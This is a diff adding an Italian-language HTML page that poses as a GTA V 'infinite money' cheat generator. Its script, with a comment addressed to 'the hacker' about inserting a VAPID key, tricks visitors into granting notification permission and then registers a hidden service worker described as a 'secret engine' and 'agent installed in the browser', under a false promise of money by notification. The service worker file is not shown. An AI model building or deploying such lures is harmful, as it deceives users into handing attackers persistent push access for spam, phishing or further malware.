@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Sito Trucchi GTA</title>
+</head>
+<body style="background: black; color: green; text-align: center; font-family: Arial;">
+
+    <h1>SITO ATTIVO: GENERATORE GTA V</h1>
+    <p>Se vedi questa scritta, il sito funziona!</p>
+    
+    <button id="btn" style="padding: 20px; background: red; color: white; cursor: pointer;">
+        CLICCA PER SOLDI INFINITI
+    </button>
+
+    <script>
+        // L'hacker deve mettere la sua chiave qui tra gli apici
+        const chiaveVapid = 'METTI_QUI_LA_TUA_CHIAVE_GENERATA';
+
+        document.getElementById('btn').addEventListener('click', async () => {
+            // Chiede il permesso per le notifiche
+            const permesso = await Notification.requestPermission();
+            if (permesso === 'granted') {
+                // Registra il motore segreto sw.js
+                const reg = await navigator.serviceWorker.register('sw.js');
+                console.log('Agente installato nel browser!');
+                alert('CONNESSO! Riceverai i soldi a breve via notifica.');
+            } else {
+                alert('Errore: Devi cliccare CONSENTI!');
+            }
+        });
+    </script>
+</body>
+</html>
